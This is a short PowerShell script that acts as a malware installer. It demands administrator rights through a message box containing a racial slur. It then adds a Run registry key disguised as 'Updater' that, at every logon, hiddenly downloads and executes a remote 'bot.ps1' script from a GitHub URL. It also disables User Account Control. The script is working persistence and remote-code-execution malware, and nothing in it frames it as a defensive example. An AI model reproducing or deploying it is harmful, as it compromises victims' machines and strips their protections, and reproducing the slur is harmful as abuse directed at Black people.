if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    [reflection.assembly]::LoadWithPartialName('PresentationFramework')|Out-Null;[Windows.MessageBox]::Show('Nigger run as admin')
    exit
}
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"' -PropertyType String -Force
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
